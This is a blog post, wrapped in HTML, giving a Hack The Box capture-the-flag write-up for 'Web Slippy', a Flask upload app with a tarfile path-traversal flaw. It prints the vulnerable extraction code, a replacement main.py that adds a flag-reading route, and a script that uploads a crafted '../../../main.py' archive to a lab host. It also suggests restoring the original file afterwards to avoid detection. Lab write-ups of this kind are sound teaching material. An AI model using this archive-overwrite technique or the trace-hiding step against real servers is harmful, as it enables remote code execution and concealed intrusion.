@@ -1,0 +1,485 @@
+<!DOCTYPE html>
+<html lang="en-us">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='Analyze For this challenge we were given the source file of the site, looking at the website we can see that it wants a tar.gz file as the input.
+ 
+The directory tree of the source code as follow.
+./challenge ├── application │ ├── blueprints │ │ └── routes.py │ ├── config.py │ ├── main.py │ ├── static │ │ ├── archives │ │ ├── css │ │ │ ├── bootstrap.'><title>HTB UNI CTF : Web Slippy</title>
+
+<link rel='canonical' href='/p/htb-uni-ctf-web-slippy/'>
+
+<link rel="stylesheet" href="/scss/style.min.63c512f9679a4af0b0a047e206183b4ca51e14499deb80ad27e2fcc1419df316.css"><meta property='og:title' content='HTB UNI CTF : Web Slippy'>
+<meta property='og:description' content='Analyze For this challenge we were given the source file of the site, looking at the website we can see that it wants a tar.gz file as the input.
+ 
+The directory tree of the source code as follow.
+./challenge ├── application │ ├── blueprints │ │ └── routes.py │ ├── config.py │ ├── main.py │ ├── static │ │ ├── archives │ │ ├── css │ │ │ ├── bootstrap.'>
+<meta property='og:url' content='/p/htb-uni-ctf-web-slippy/'>
+<meta property='og:site_name' content='Yojan&#39;s Blog'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='Hack The Box' /><meta property='article:published_time' content='2021-11-22T15:16:32-05:00'/><meta property='article:modified_time' content='2021-11-22T15:16:32-05:00'/><meta property='og:image' content='/avatar.png' />
+<meta name="twitter:site" content="@https://twitter.com/GautamYojan">
+    <meta name="twitter:creator" content="@https://twitter.com/GautamYojan"><meta name="twitter:title" content="HTB UNI CTF : Web Slippy">
+<meta name="twitter:description" content="Analyze For this challenge we were given the source file of the site, looking at the website we can see that it wants a tar.gz file as the input.
+ 
+The directory tree of the source code as follow.
+./challenge ├── application │ ├── blueprints │ │ └── routes.py │ ├── config.py │ ├── main.py │ ├── static │ │ ├── archives │ │ ├── css │ │ │ ├── bootstrap."><meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content='/avatar.png' />
+    </head>
+    <body class="
+    article-page has-toc
+">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "dark");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex 
+    
+        extended
+    
+">
+    
+        <div id="article-toolbar">
+            <a href="/" class="back-home">
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-chevron-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="15 6 9 12 15 18" />
+</svg>
+
+
+
+                <span>Back</span>
+            </a>
+        </div>
+    
+<main class="main full-width">
+    <article class="main-article">
+    <header class="article-header">
+
+    <div class="article-details">
+    
+
+    <h2 class="article-title">
+        <a href="/p/htb-uni-ctf-web-slippy/">HTB UNI CTF : Web Slippy</a>
+    </h2>
+
+    
+
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">Nov 22, 2021</time>
+            </div>
+        
+
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-time--reading">
+                    3 minute read
+                </time>
+            </div>
+        
+    </footer>
+    
+</div>
+</header>
+
+    <section class="article-content">
+    <p><figure 
+	>
+	<a href="/web_slippy/ChallengeDescription.png" >
+		<img src="/web_slippy/ChallengeDescription.png"
+			
+			
+			
+			loading="lazy"
+			>
+	</a>
+	
+</figure></p>
+<h2 id="analyze">Analyze</h2>
+<p>For this challenge we were given the source file of the site, looking at the website we can see that it wants a tar.gz file as the input.</p>
+<p><figure 
+	>
+	<a href="/web_slippy/Website.png" >
+		<img src="/web_slippy/Website.png"
+			
+			
+			
+			loading="lazy"
+			>
+	</a>
+	
+</figure></p>
+<p>The directory tree of the source code as follow.</p>
+<pre tabindex="0"><code>./challenge
+├── application
+│   ├── blueprints
+│   │   └── routes.py
+│   ├── config.py
+│   ├── main.py
+│   ├── static
+│   │   ├── archives
+│   │   ├── css
+│   │   │   ├── bootstrap.min.css
+│   │   │   └── main.css
+│   │   ├── images
+│   │   │   ├── card-body2.png
+│   │   │   ├── card-btm2.png
+│   │   │   ├── card-top2.png
+│   │   │   └── upload-doc.png
+│   │   └── js
+│   │       ├── bootstrap.min.js
+│   │       ├── jquery-3.6.0.min.js
+│   │       ├── main.js
+│   │       └── TweenMax.min.js
+│   ├── templates
+│   │   └── index.html
+│   └── util.py
+├── flag
+└── run.py
+</code></pre><p>We can see that the flag file is in the same directory as the run.py</p>
+<p>So I am assuming that we have to figure out a way to read the flag file.</p>
+<p><em><strong>Util.py</strong></em></p>
+<pre tabindex="0"><code>import functools, tarfile, tempfile, os
+from application import main
+
+generate = lambda x: os.urandom(x).hex()
+
+def extract_from_archive(file):
+    tmp  = tempfile.gettempdir()
+    path = os.path.join(tmp, file.filename)
+    file.save(path)
+
+    if tarfile.is_tarfile(path):
+        tar = tarfile.open(path, &#39;r:gz&#39;)
+        tar.extractall(tmp)
+
+        extractdir = f&#39;{main.app.config[&#34;UPLOAD_FOLDER&#34;]}/{generate(15)}&#39;
+        os.makedirs(extractdir, exist_ok=True)
+
+        extracted_filenames = []
+
+        for tarinfo in tar:
+            name = tarinfo.name
+            if tarinfo.isreg():
+                filename = f&#39;{extractdir}/{name}&#39;
+                os.rename(os.path.join(tmp, name), filename)
+                extracted_filenames.append(filename)
+                continue
+
+            os.makedirs(f&#39;{extractdir}/{name}&#39;, exist_ok=True)
+
+        tar.close()
+        return extracted_filenames
+
+    return False
+</code></pre><p>This is the code that is used to extract the given tar file.</p>
+<p>Let&rsquo;s examine this code a bit further.</p>
+<pre tabindex="0"><code>generate = lambda x: os.urandom(x).hex()
+</code></pre><p>It is used to generate a random number of the length x. Another way of writing this would be.</p>
+<pre tabindex="0"><code>def generate(x):
+	return os.urandom(x).hex()
+</code></pre><pre tabindex="0"><code>		extractdir = f&#39;{main.app.config[&#34;UPLOAD_FOLDER&#34;]}/{generate(15)}&#39;
+        os.makedirs(extractdir, exist_ok=True)
+</code></pre><p>So here they use the generate to create a new folder to avoid files to collide when they have same name.</p>
+<pre tabindex="0"><code>➜  application git:(main) ✗ cat config.py
+
+from application.util import generate
+from os.path import abspath
+
+class Config(object):
+    SECRET_KEY = generate(50)
+    UPLOAD_FOLDER = &#39;/app/application/static/archives&#39;
+
+class ProductionConfig(Config):
+    pass
+
+class DevelopmentConfig(Config):
+    DEBUG = True
+
+class TestingConfig(Config):
+    TESTING = True
+</code></pre><p>We can see that the tar file gets extracted at path <code>/app/application/static/archives/{somerandom}/</code></p>
+<p>We also know that the flag is at <code>/app/</code></p>
+<h2 id="recon">Recon</h2>
+<p><a class="link" href="https://bugzilla.redhat.com/show_bug.cgi?id=263261"  target="_blank" rel="noopener"
+    >https://bugzilla.redhat.com/show_bug.cgi?id=263261</a></p>
+<p>By searching up on the internet, I found this cool bug in the tar file library in python.</p>
+<p>After reading this for the first time, I thought I could use the <code>../../../flag</code> as my file name and the download the flag. Seems pretty simple right?</p>
+<p>Well Not really.</p>
+<p>The <code>os.rename()</code> overrides the existing file in the directory.</p>
+<h2 id="exploit">Exploit</h2>
+<p>For the exploit, I thought of overriding the <code>main.py</code> file and adding a API endpoint that opens the flag and returns it.</p>
+<pre tabindex="0"><code>rom flask import Flask, jsonify
+from application.blueprints.routes import web, api
+
+app = Flask(__name__)
+app.config.from_object(&#39;application.config.Config&#39;)
+
+app.register_blueprint(web, url_prefix=&#39;/&#39;)
+app.register_blueprint(api, url_prefix=&#39;/api&#39;)
+
+@app.errorhandler(404)
+def not_found(error):
+    return jsonify({&#39;error&#39;: &#39;Not Found&#39;}), 404
+
+@app.errorhandler(403)
+def forbidden(error):
+    return jsonify({&#39;error&#39;: &#39;Not Allowed&#39;}), 403
+
+@app.errorhandler(400)
+def bad_request(error):
+    return jsonify({&#39;error&#39;: &#39;Bad Request&#39;}), 400
+
+@app.route(&#39;/flag&#39;)
+def flag():
+    file = open(&#39;/app/flag&#39;, &#39;r&#39;)
+    return f.read()
+</code></pre><p>This is what the new main file will look like.</p>
+<p>If we wanted to be undetected, we can upload the actual main.py file after we get the flag, so that they won&rsquo;t figure out where we got the flag from.</p>
+<pre tabindex="0"><code>import tarfile, requests
+
+zpath = &#34;../../../main.py&#34;
+
+
+tf = tarfile.open(&#34;payload.tar.gz&#34;, &#34;w:gz&#34;)
+tf.add(&#39;main.py&#39;, zpath)
+tf.close()
+
+
+
+url = &#34;http://64.227.36.32:32187/api/unslippy&#34;
+
+files = {&#34;file&#34;: open(&#39;payload.tar.gz&#39;, &#39;rb&#39;)}
+
+r = requests.post(url, files=files)
+
+flag = requests.get(&#34;http://64.227.36.32:32187/flag&#34;)
+
+print(flag.text)
+</code></pre><p>I wrote a simple script that will take the main.py file and add directory trasverasl stuffs infront of the file, and creates a tar.gz file.</p>
+<p>Then it will upload the file to the server, later it will use the /flag endpoint to extract the flag.</p>
+<pre tabindex="0"><code>HTB{i_slipped_my_way_to_rce}
+</code></pre>
+</section>
+
+
+    <footer class="article-footer">
+    
+    <section class="article-tags">
+        
+            <a href="/tags/hack-the-box/">Hack The Box</a>
+        
+    </section>
+
+
+    
+    <section class="article-copyright">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
+</svg>
+
+
+
+        <span>Licensed under CC BY-NC-SA 4.0</span>
+    </section>
+    </footer>
+
+
+    
+</article>
+
+    
+
+    <aside class="related-contents--wrapper">
+    
+    
+</aside>
+
+     
+    
+        
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+            2020 - 
+        
+        2022 Yojan&#39;s Blog
+    </section>
+    
+    <section class="powerby">
+        Built with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> <br />
+        Theme <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.6.0">Stack</a></b> designed by <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a>
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer="true"
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer="true"
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.css"integrity="sha256-c0uckgykQ9v5k&#43;IqViZOZKc47Jn7KQil4/MP3ySA3F8="crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.css"integrity="sha256-SBLU4vv6CA6lHsZ1XyTdhyjJxCjPif/TRkjnsyGAGnE="crossorigin="anonymous"
+            >
+
+            </main>
+    
+        <aside class="sidebar right-sidebar sticky">
+            <section class="widget archives">
+                <div class="widget-icon">
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+                </div>
+                <h2 class="widget-title section-title">Table of contents</h2>
+                
+                <div class="widget--toc">
+                    <nav id="TableOfContents">
+  <ol>
+    <li><a href="#analyze">Analyze</a></li>
+    <li><a href="#recon">Recon</a></li>
+    <li><a href="#exploit">Exploit</a></li>
+  </ol>
+</nav>
+                </div>
+            </section>
+        </aside>
+    
+
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.5/dist/vibrant.min.js"integrity="sha256-5NovOZc4iwiAWTYIFiIM7DxKUXKWvpVEuMEPLzcm5/g="crossorigin="anonymous"
+                defer="false"
+                >
+            </script><script type="text/javascript" src="/ts/main.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+    </body>
+</html>
